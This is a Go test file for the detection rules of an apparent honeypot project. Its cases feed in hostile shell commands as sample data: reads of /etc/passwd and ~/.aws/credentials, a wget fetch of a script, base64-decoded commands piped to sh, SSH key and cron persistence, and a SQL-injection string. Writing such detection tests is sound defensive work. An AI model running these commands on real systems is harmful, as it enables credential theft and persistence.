package rules

import (
	"path/filepath"
	"runtime"
	"testing"

	"github.com/ryuma04/decoy/backend/internal/intel/mitre"
)

func loadSet(t *testing.T) *Set {
	t.Helper()
	_, file, _, _ := runtime.Caller(0)
	s, err := Load(filepath.Join(filepath.Dir(file), "..", "..", "..", "rules", "rules.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	return s
}

func cmd(raw, argv0 string, args ...string) Input {
	a := make([]any, len(args))
	for i, x := range args {
		a[i] = x
	}
	return Input{Type: "shell.command", Data: map[string]any{"raw": raw, "argv0": argv0, "args": a}}
}

func ids(ms []Match) map[string]Match {
	out := map[string]Match{}
	for _, m := range ms {
		out[m.Rule.ID] = m
	}
	return out
}

func TestEveryStarterRuleExistsWithKnownTechnique(t *testing.T) {
	s := loadSet(t)
	want := []string{"port_sweep", "password_guessing", "credential_stuffing", "interactive_shell", "system_discovery",
		"account_discovery", "cred_file_search", "honeytoken_read", "honeytoken_used", "ingress_tool_transfer",
		"ssh_persistence", "cron_persistence", "obfuscated_command", "container_discovery", "container_secrets",
		"cmd_injection", "sqli_attempt", "xss_attempt", "path_traversal_attempt", "multi_decoy"}
	have := map[string]*Rule{}
	for _, r := range s.Rules {
		have[r.ID] = r
	}
	for _, id := range want {
		r, ok := have[id]
		if !ok {
			t.Errorf("missing rule %s", id)
			continue
		}
		if r.Technique != "" {
			if _, ok := mitre.Lookup(r.Technique); !ok {
				t.Errorf("%s: technique %s not in MITRE table", id, r.Technique)
			}
		}
	}
}

func TestEventRulesPositiveAndNegative(t *testing.T) {
	s := loadSet(t)
	cases := []struct {
		name  string
		in    Input
		fires []string
		not   []string
	}{
		{"discovery", cmd("uname -a", "uname", "-a"), []string{"system_discovery"}, []string{"cred_file_search"}},
		{"release", cmd("cat /etc/os-release", "cat", "/etc/os-release"), []string{"system_discovery"}, nil},
		{"passwd", cmd("cat /etc/passwd", "cat", "/etc/passwd"), []string{"account_discovery"}, []string{"cred_file_search"}},
		{"id user", cmd("id deploy", "id", "deploy"), []string{"account_discovery", "system_discovery"}, nil},
		{"aws creds", cmd("cat ~/.aws/credentials", "cat", "~/.aws/credentials"), []string{"cred_file_search"}, nil},
		{"find kube", cmd(`find / -name "*.kube*" 2>/dev/null`, "find"), []string{"cred_file_search"}, nil},
		{"plain ls", cmd("ls -la", "ls", "-la"), nil, []string{"cred_file_search", "system_discovery", "obfuscated_command"}},
		{"wget", cmd("wget http://x/a.sh", "wget", "http://x/a.sh"), []string{"ingress_tool_transfer"}, nil},
		{"authorized keys", cmd(`echo "ssh-ed25519 AAA" >> ~/.ssh/authorized_keys`, "echo"), []string{"ssh_persistence"}, nil},
		{"cron", cmd("(crontab -l; echo x) | crontab -", "crontab"), []string{"cron_persistence"}, nil},
		{"base64", cmd("echo aWQ= | base64 -d | sh", "echo"), []string{"obfuscated_command"}, nil},
		{"honeyfile", Input{Type: "file.read", Data: map[string]any{"path": "/home/deploy/.aws/credentials", "honeyfile_id": "tok_aws_k7"}},
			[]string{"honeytoken_read"}, nil},
		{"normal read", Input{Type: "file.read", Data: map[string]any{"path": "/etc/hostname", "honeyfile_id": nil}}, nil, []string{"honeytoken_read"}},
		{"k8s pods", Input{Type: "k8s.api_call", Data: map[string]any{"verb": "list", "resource": "pods"}}, []string{"container_discovery"}, []string{"container_secrets"}},
		{"k8s secrets", Input{Type: "k8s.api_call", Data: map[string]any{"verb": "get", "resource": "secrets"}}, []string{"container_secrets"}, nil},
		{"scan", Input{Type: "scan.detected", Data: map[string]any{}}, []string{"port_sweep"}, nil},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := ids(s.Evaluate("event", c.in))
			for _, id := range c.fires {
				if _, ok := got[id]; !ok {
					t.Errorf("expected %s to fire, got %v", id, keys(got))
				}
			}
			for _, id := range c.not {
				if _, ok := got[id]; ok {
					t.Errorf("%s must not fire", id)
				}
			}
		})
	}
}

func TestTokenSensitivityScaling(t *testing.T) {
	s := loadSet(t)
	m := ids(s.Evaluate("event", Input{Type: "token.used", Data: map[string]any{}, TokenSens: 5}))["honeytoken_used"]
	if m.Points != 50 || m.Rule.Stage != "lateral" {
		t.Fatalf("points %d stage %s", m.Points, m.Rule.Stage)
	}
}

func TestInputRiskScaling(t *testing.T) {
	s := loadSet(t)
	in := Input{Type: "input.suspicious", Data: map[string]any{"value": "1' or 1=1"},
		InputRisk: &InputRisk{Label: "sqli", Risk: 0.8, Source: "rule+ml"}}
	m := ids(s.Evaluate("event", in))["sqli_attempt"]
	if m.Points != 12 || m.Confidence != 0.8 || m.Source != "rule+ml" {
		t.Fatalf("%+v", m)
	}
	in.InputRisk.Risk = 0.4
	if _, ok := ids(s.Evaluate("event", in))["sqli_attempt"]; ok {
		t.Fatal("fired below 0.5")
	}
}

func TestFeatureRules(t *testing.T) {
	s := loadSet(t)
	f := map[string]float64{"failed_auths_5m": 6, "distinct_pairs": 2, "successful_logins": 1, "commands": 3}
	got := ids(s.Evaluate("session", Input{Features: f}))
	if _, ok := got["password_guessing"]; !ok {
		t.Error("password_guessing")
	}
	if _, ok := got["interactive_shell"]; !ok {
		t.Error("interactive_shell")
	}
	if _, ok := got["credential_stuffing"]; ok {
		t.Error("credential_stuffing fired with 2 pairs")
	}
	if _, ok := ids(s.Evaluate("actor", Input{Features: map[string]float64{"services_visited": 3}}))["multi_decoy"]; !ok {
		t.Error("multi_decoy")
	}
}

func TestParseRejectsBadRules(t *testing.T) {
	bad := []string{
		`[{id: a, scope: event, stage: recon, points: 0, when: {type: x}}]`,
		`[{id: a, scope: nope, stage: recon, points: 1, when: {type: x}}]`,
		`[{id: a, scope: event, stage: nope, points: 1, when: {type: x}}]`,
		`[{id: a, scope: event, stage: recon, points: 1, when: {regex: "("}}]`,
		`[{id: a, scope: event, stage: recon, points: 1}, {id: a, scope: event, stage: recon, points: 1}]`,
	}
	for _, b := range bad {
		if _, err := Parse([]byte(b)); err == nil {
			t.Errorf("accepted %s", b)
		}
	}
}

func keys(m map[string]Match) []string {
	var out []string
	for k := range m {
		out = append(out, k)
	}
	return out
}
